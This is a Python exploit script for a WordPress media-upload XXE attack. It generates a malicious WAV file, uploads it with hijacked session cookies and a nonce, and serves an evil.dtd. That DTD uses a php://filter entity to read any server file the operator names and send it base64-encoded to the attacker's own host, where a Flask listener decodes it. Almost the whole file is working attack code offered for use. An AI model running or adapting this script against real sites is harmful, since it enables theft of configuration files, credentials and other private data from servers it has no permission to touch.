import argparse
import sys
import threading
from os import popen, system
import logging
import requests
from time import sleep
from flask import Flask, request, send_from_directory

logging.getLogger('werkzeug').disabled = True

argparser = argparse.ArgumentParser()
argparser.add_argument("-u", '--url', help="The target URL")
argparser.add_argument("-l", '--lhost', help="The attacker's IP address")
argparser.add_argument(
    "-p", '--lport', help="The attacker's port", default=8001)
argparser.add_argument("-cH", '--cookie-hash',
                       help='The hash used in Wordpress cookies')
argparser.add_argument("-cW", '--cookie-wordpress',
                       help="The cookie of the wordpress session (wordpress_[hash])")
argparser.add_argument("-cL", '--cookie-logged',
                       help="The cookie of the logged session (wordpress_logged_in_[hash])")
argparser.add_argument(
    '-n', '--nonce', help="The nonce of the Wordpress session")
argparser.add_argument(
    '-pr', '--proxy', help="The proxy to use (http://host:port)", default=None)

args = argparser.parse_args()
if not args.url:
    print("[-] Please specify the target URL")
    exit(1)

if not args.lhost:
    print("[-] Please specify the attacker's IP address")
    exit(1)

if not args.cookie_hash:
    print("[-] Please specify the cookie hash")
    exit(1)

if not args.cookie_wordpress:
    print("[-] Please specify the Wordpress cookie")
    exit(1)

if not args.cookie_logged:
    print("[-] Please specify the logged cookie")
    exit(1)

if not args.nonce:
    print("[-] Please specify the nonce")
    exit(1)


def error(s: str):
    print(f"[-] {s}", file=sys.stderr)
    exit(1)


def create_payload():
    try:
        system(
            f'node ./malicious_wav_generator/index.js {args.lhost} {args.lport}')
        print("[+] Payload created")
        return 1
    except:
        error("Error creating payload")


def send_payload():
    try:
        url = args.url + "wp-admin/async-upload.php"
        res = requests.post(url, cookies={
            "wordpress_test_cookie": "WP+Cookie+check",
            f"wordpress_{args.cookie_hash}": args.cookie_wordpress,
            f"wordpress_logged_in_{args.cookie_hash}": args.cookie_logged
        }, files={
            'async-upload': ('payload.wav', open('payloads/malicious.wav', 'rb')),
        },
            data={
            'name': 'payload.wav',
            '_wpnonce': args.nonce,
            'html-upload': 'Upload'
        },
            proxies={
                'http': args.proxy if args.proxy else None,
                'https': args.proxy if args.proxy else None
        })
        print(res.content)
        return 1
    except Exception as e:
        error(f"Error sending payload:\n{e}")


def modify_file(file: str):
    # modify evil.dtd
    with open('payloads/evil.dtd', 'w') as f:
        evil_dtd = f'''<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={file}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://{args.lhost}:{args.lport}/response?p=%file;'>" >
'''
        f.write(evil_dtd)


def decode(b64: str):
    try:
        return popen(f"php decrypt.php '{b64}'").read()
    except Exception as e:
        error(f"Error decoding the payload:\n{e}")


flask = Flask(__name__, static_url_path='')


def create_server():
    @flask.route('/response')
    def decrypt():
        f = decode(request.args.get('p'))
        print(f)
        return f

    @flask.route('/payload')
    def evil():
        return send_from_directory('payloads', 'evil.dtd')

    app = flask.run(host=args.lhost, port=args.lport)


if __name__ == "__main__":
    create_payload()
    threading.Thread(target=create_server, ).start()
    sleep(1)
    while True:
        modify_file(input("$file$> "))
        send_payload()
